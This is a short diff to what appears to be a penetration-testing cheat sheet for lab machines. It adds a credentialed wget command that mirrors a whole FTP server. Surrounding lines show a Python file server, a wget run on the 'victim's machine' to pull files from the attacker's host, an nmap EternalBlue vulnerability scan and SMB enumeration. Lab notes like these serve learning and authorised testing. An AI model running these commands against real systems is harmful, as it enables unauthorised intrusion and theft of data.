@@ -68,6 +68,10 @@ python -m SimpleHTTPServer #running python server on port 8000
 
 wget -r http://10.10.14.28:8000/ #run this on victim's machine for transfering file from your own to victim's machine.
 
+Run this with username and password to download everything hosted over a ftp server:
+
+wget --user test --password 'test' -r ftp://10.10.10.197
+
 nmap --script vuln -p135,139,445 10.10.10.40 -oA blue_scripts #If the target is vulnerable to Eternal Blue exploit 
 
 smbclient -L //10.10.10.40 #smb recon
